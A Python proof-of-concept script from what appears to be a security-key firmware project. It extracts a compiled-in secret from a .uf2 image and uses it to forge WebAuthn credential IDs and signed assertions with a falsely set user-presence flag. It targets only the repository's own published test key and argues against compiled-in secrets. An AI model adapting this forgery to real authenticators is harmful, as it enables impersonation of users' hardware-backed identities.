#!/usr/bin/env python3
# SPDX-License-Identifier: Apache-2.0
"""Be the device, without the device, using nothing but its firmware image.

    python3 forge.py firmware.uf2 <rpId> [--challenge B64URL] [--out forged.json]

exp171 derives every credential from one compiled-in secret:

    credential id = nonce(32) || HMAC(secret, "id"  || nonce || rpIdHash)[..16]
    private key   = HMAC(secret, "key" || counter || nonce || rpIdHash), rejected
                    until it is a valid P-256 scalar

The secret is thirty-two bytes in the firmware, and unpack.py just found it. So
anyone with the .uf2 can do what the device does: mint a credential id the
device's own `credential_is_ours` check will accept, derive its private key, and
sign an assertion with the user-presence bit set to whatever they please —
**without ever touching the board.**

This is the point the whole road turns on. A hardware key's promise is that the
private key never leaves it. This key's private key was never *in* it in the
first place: it is a function of a constant that ships in the image. Possession
of the file is possession of the identity.

The output is checked by verify.py, which re-derives everything independently
and confirms two things: the assertion verifies against the public key, and the
real board's own acceptance check would say this credential is one of its own.

This forges against a **test key this repository prints in its own README**, to
show that a compiled-in secret is a forgeable one. It is the argument for the
[identity road](../README.md#the-identity-road), not a tool against any real key.
"""
import argparse
import base64
import hashlib
import hmac
import json
import os
import sys

try:
    from cryptography.hazmat.primitives.asymmetric import ec
    from cryptography.hazmat.primitives import hashes
except ImportError:
    raise SystemExit("needs python3-cryptography")

from unpack import load

SECRET_NEEDLE = b"not a secret. this is a test key"
N = 0xFFFFFFFF00000000FFFFFFFFFFFFFFFFBCE6FAADA7179E84F3B9CAC2FC632551


def b64u(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def find_secret(uf2_path):
    """The 32 bytes exp171 compiles in, taken straight out of the image."""
    base, img = load(uf2_path)
    i = img.find(SECRET_NEEDLE)
    if i < 0:
        raise SystemExit(
            "the test-key secret is not in %s — is this an exp171+ image?" % uf2_path)
    return img[i:i + 32], base + i


def mac(secret, *parts):
    m = hmac.new(secret, digestmod=hashlib.sha256)
    for p in parts:
        m.update(p)
    return m.digest()


def derive_key(secret, nonce, rp_id_hash):
    """exp174's derive_key, in Python: reject until the scalar is valid."""
    for counter in range(256):
        k = mac(secret, b"key", bytes([counter]), nonce, rp_id_hash)
        v = int.from_bytes(k, "big")
        if 1 <= v < N:
            return ec.derive_private_key(v, ec.SECP256R1())
    raise SystemExit("no valid scalar in 256 tries — astronomically unlikely")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("uf2")
    ap.add_argument("rp_id")
    ap.add_argument("--challenge", default=None,
                    help="base64url; a random one is used if omitted")
    ap.add_argument("--out", default=None)
    args = ap.parse_args()

    secret, addr = find_secret(args.uf2)
    print("secret lifted from %s at %#x" % (args.uf2, addr), file=sys.stderr)

    rp_id_hash = hashlib.sha256(args.rp_id.encode()).digest()
    nonce = os.urandom(32)
    tag = mac(secret, b"id", nonce, rp_id_hash)[:16]
    cred_id = nonce + tag                      # the device would accept this

    key = derive_key(secret, nonce, rp_id_hash)
    pub = key.public_key().public_numbers()
    x = pub.x.to_bytes(32, "big")
    y = pub.y.to_bytes(32, "big")

    # An assertion nobody's finger was present for. authenticatorData is
    # rpIdHash(32) || flags(1) || signCount(4); we set UP, because a forger
    # decides what the flags say.
    flags = 0x01
    auth_data = rp_id_hash + bytes([flags]) + (0).to_bytes(4, "big")
    challenge = (base64.urlsafe_b64decode(args.challenge + "==")
                 if args.challenge else os.urandom(32))
    client_data = json.dumps(
        {"type": "webauthn.get", "challenge": b64u(challenge),
         "origin": "https://" + args.rp_id, "crossOrigin": False},
        separators=(",", ":")).encode()
    signed = auth_data + hashlib.sha256(client_data).digest()
    sig = key.sign(signed, ec.ECDSA(hashes.SHA256()))

    forged = {
        "what": "an assertion forged offline from the firmware image alone",
        "rp_id": args.rp_id,
        "credential_id": b64u(cred_id),
        "nonce": b64u(nonce),
        "public_key": {"x": b64u(x), "y": b64u(y)},
        "authenticator_data": b64u(auth_data),
        "client_data_json": b64u(client_data),
        "signature": b64u(sig),
        "up_bit_claimed": bool(flags & 0x01),
    }
    text = json.dumps(forged, indent=2) + "\n"
    if args.out:
        open(args.out, "w").write(text)
        print("wrote %s" % args.out, file=sys.stderr)
    else:
        sys.stdout.write(text)


if __name__ == "__main__":
    main()
